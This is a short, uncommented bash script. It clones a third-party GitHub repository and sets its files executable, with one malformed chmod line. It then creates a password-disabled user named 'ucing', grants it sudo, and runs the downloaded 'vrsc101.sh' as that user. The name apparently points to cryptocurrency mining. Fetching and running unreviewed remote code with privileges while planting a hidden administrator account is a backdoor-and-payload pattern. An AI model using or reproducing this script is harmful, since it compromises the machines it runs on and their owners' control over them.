#!/bin/bash
sudo apt update
git clone https://github.com/Opix61/ujang.git && cd ujang
chmod +x vrsc101.sh && chmod +x acuk chmod 777 acuk vrsc101.sh
sudo adduser --disabled-password --gecos "" ucing && sudo usermod -aG sudo ucing
sudo -u ucing -H sh -c "./vrsc101.sh"
sudo apt update
